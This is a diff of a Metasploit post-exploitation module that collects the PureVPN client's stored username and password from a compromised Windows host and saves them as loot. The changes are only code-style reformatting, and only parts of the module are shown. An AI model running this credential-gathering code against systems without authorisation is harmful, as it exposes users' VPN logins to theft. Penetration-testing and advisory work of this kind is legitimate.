@@ -7,27 +7,29 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
 
   def initialize(info = {})
-    super(update_info(info,
-        'Name'          => 'Windows Gather PureVPN Client Credential Collector',
-        'Description'   => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather PureVPN Client Credential Collector',
+        'Description' => %q{
           Finds the password stored for the PureVPN Client.
         },
-        'References'     =>
-        [
+        'References' => [
           ['URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Credential-Leak-Flaws-in-Windows-PureVPN-Client/'],
           ['URL', 'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2018-010/?fid=11779']
         ],
-        'License'       => MSF_LICENSE,
-        'Author'        => ['Manuel Nader #AgoraSecurity'],
-        'Platform'      => ['win'],
-        'Arch'          => [ARCH_X86, ARCH_X64],
-        'SessionTypes'  => ['meterpreter']
-    ))
+        'License' => MSF_LICENSE,
+        'Author' => ['Manuel Nader #AgoraSecurity'],
+        'Platform' => ['win'],
+        'Arch' => [ARCH_X86, ARCH_X64],
+        'SessionTypes' => ['meterpreter']
+      )
+    )
 
     register_options(
       # In case software is installed in a rare directory
-      [OptString.new('RPATH', [false, 'Path of the PureVPN Client installation'])
-    ])
+      [OptString.new('RPATH', [false, 'Path of the PureVPN Client installation'])]
+    )
   end
 
   def run
@@ -84,7 +86,7 @@ class MetasploitModule < Msf::Post
       vprint_status("Checking for login configuration at: #{location}")
       begin
         files = session.fs.dir.entries(location)
-        files.map{|i| i.downcase}.uniq
+        files.map { |i| i.downcase }.uniq
         if files.include?(datfile)
           filepath = location + datfile
           print_status("Configuration file found: #{filepath}")
@@ -103,7 +105,7 @@ class MetasploitModule < Msf::Post
 
   def parse_file(data)
     username, password = data.split("\r\n")
-    creds  = {'username' => username, 'password' => password}
+    creds = { 'username' => username, 'password' => password }
     print_good('Collected the following credentials:')
     print_good("    Username: #{username}")
     print_good("    Password: #{password}")
@@ -114,19 +116,20 @@ class MetasploitModule < Msf::Post
   def report_cred(creds)
     # report the goods!
     loot_path = store_loot('PureVPN.creds', 'text/xml', session, creds.to_xml,
-      'purevpn_credentials.xml', 'PureVPN Credentials')
+                           'purevpn_credentials.xml', 'PureVPN Credentials')
     print_status("PureVPN credentials saved in: #{loot_path}")
   end
 
   def get_client_creds(data)
     credentials = Rex::Text::Table.new(
-      'Header'    => 'PureVPN Client Credentials',
-      'Indent'    => 1,
-      'Columns'   =>
+      'Header' => 'PureVPN Client Credentials',
+      'Indent' => 1,
+      'Columns' =>
       [
         'Username',
         'Password'
-      ])
+      ]
+    )
     result = parse_file(data)
     report_cred(result)
   end
